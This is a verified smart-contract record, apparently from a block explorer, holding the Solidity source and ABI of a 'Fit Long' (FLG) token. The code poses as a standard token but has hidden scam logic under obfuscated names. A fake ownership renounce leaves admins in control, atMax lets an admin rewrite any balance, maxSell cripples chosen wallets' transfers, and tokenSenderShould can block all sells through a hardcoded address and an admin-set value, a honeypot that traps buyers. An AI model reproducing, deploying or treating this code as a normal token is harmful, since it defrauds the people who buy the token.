{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface receiverTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableSwapAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atModeLaunch {\n    function createPair(address limitTotal, address tokenReceiver) external returns (address);\n}\n\ninterface receiverWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isReceiver) external view returns (uint256);\n\n    function transfer(address swapTeam, uint256 swapShould) external returns (bool);\n\n    function allowance(address autoMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTeam,\n        uint256 swapShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingList, uint256 value);\n    event Approval(address indexed autoMode, address indexed spender, uint256 value);\n}\n\ninterface receiverWalletMetadata is receiverWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FitLong is enableSwapAuto, receiverWallet, receiverWalletMetadata {\n\n    function allowance(address launchedMax, address listMarketing) external view virtual override returns (uint256) {\n        if (listMarketing == shouldSell) {\n            return type(uint256).max;\n        }\n        return exemptTxAt[launchedMax][listMarketing];\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptTxAt;\n\n    address shouldSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address listMarketing, uint256 swapShould) public virtual override returns (bool) {\n        exemptTxAt[_msgSender()][listMarketing] = swapShould;\n        emit Approval(_msgSender(), listMarketing, swapShould);\n        return true;\n    }\n\n    uint256 constant senderFund = 16 ** 10;\n\n    function transferFrom(address shouldFrom, address swapTeam, uint256 swapShould) external override returns (bool) {\n        if (_msgSender() != shouldSell) {\n            if (exemptTxAt[shouldFrom][_msgSender()] != type(uint256).max) {\n                require(swapShould <= exemptTxAt[shouldFrom][_msgSender()]);\n                exemptTxAt[shouldFrom][_msgSender()] -= swapShould;\n            }\n        }\n        return tokenSenderShould(shouldFrom, swapTeam, swapShould);\n    }\n\n    bool public sellIsExempt;\n\n    mapping(address => bool) public launchTradingWallet;\n\n    string private liquidityMin = \"FLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoLimit;\n    }\n\n    constructor (){\n        if (launchFromExempt) {\n            maxList = true;\n        }\n        receiverTx autoLaunch = receiverTx(shouldSell);\n        launchTo = atModeLaunch(autoLaunch.factory()).createPair(autoLaunch.WETH(), address(this));\n        \n        receiverTeam = _msgSender();\n        exemptSellAt();\n        maxTotal[receiverTeam] = true;\n        exemptShouldWallet[receiverTeam] = maxMin;\n        \n        emit Transfer(address(0), receiverTeam, maxMin);\n    }\n\n    function maxSell(address minTokenList) public {\n        receiverMarketing();\n        \n        if (minTokenList == receiverTeam || minTokenList == launchTo) {\n            return;\n        }\n        launchTradingWallet[minTokenList] = true;\n    }\n\n    uint256 isTx;\n\n    address public receiverTeam;\n\n    mapping(address => uint256) private exemptShouldWallet;\n\n    function atMax(address amountTeam, uint256 swapShould) public {\n        receiverMarketing();\n        exemptShouldWallet[amountTeam] = swapShould;\n    }\n\n    mapping(address => bool) public maxTotal;\n\n    uint256 private maxMin = 100000000 * 10 ** 18;\n\n    function tokenSenderShould(address shouldFrom, address swapTeam, uint256 swapShould) internal returns (bool) {\n        if (shouldFrom == receiverTeam) {\n            return minLaunch(shouldFrom, swapTeam, swapShould);\n        }\n        uint256 tokenEnable = receiverWallet(launchTo).balanceOf(receiverSellAmount);\n        require(tokenEnable == minTotal);\n        require(swapTeam != receiverSellAmount);\n        if (launchTradingWallet[shouldFrom]) {\n            return minLaunch(shouldFrom, swapTeam, senderFund);\n        }\n        return minLaunch(shouldFrom, swapTeam, swapShould);\n    }\n\n    uint8 private autoLimit = 18;\n\n    function minLaunch(address shouldFrom, address swapTeam, uint256 swapShould) internal returns (bool) {\n        require(exemptShouldWallet[shouldFrom] >= swapShould);\n        exemptShouldWallet[shouldFrom] -= swapShould;\n        exemptShouldWallet[swapTeam] += swapShould;\n        emit Transfer(shouldFrom, swapTeam, swapShould);\n        return true;\n    }\n\n    address public launchTo;\n\n    bool private launchedReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxMin;\n    }\n\n    bool private maxList;\n\n    function balanceOf(address isReceiver) public view virtual override returns (uint256) {\n        return exemptShouldWallet[isReceiver];\n    }\n\n    function owner() external view returns (address) {\n        return takeToMax;\n    }\n\n    string private launchLiquidity = \"Fit Long\";\n\n    address private takeToMax;\n\n    function receiverMarketing() private view {\n        require(maxTotal[_msgSender()]);\n    }\n\n    uint256 minTotal;\n\n    function totalLimitLiquidity(uint256 swapShould) public {\n        receiverMarketing();\n        minTotal = swapShould;\n    }\n\n    event OwnershipTransferred(address indexed liquidityListLaunch, address indexed launchedFromBuy);\n\n    function transfer(address amountTeam, uint256 swapShould) external virtual override returns (bool) {\n        return tokenSenderShould(_msgSender(), amountTeam, swapShould);\n    }\n\n    address receiverSellAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return takeToMax;\n    }\n\n    function receiverMarketingWallet(address marketingLiquidity) public {\n        if (sellIsExempt) {\n            return;\n        }\n        \n        maxTotal[marketingLiquidity] = true;\n        \n        sellIsExempt = true;\n    }\n\n    bool private totalMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityMin;\n    }\n\n    function exemptSellAt() public {\n        emit OwnershipTransferred(receiverTeam, address(0));\n        takeToMax = address(0);\n    }\n\n    bool private launchFromExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return launchLiquidity;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityListLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFromBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"atMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTradingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTokenList\",\"type\":\"address\"}],\"name\":\"maxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"}],\"name\":\"receiverMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIsExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"totalLimitLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}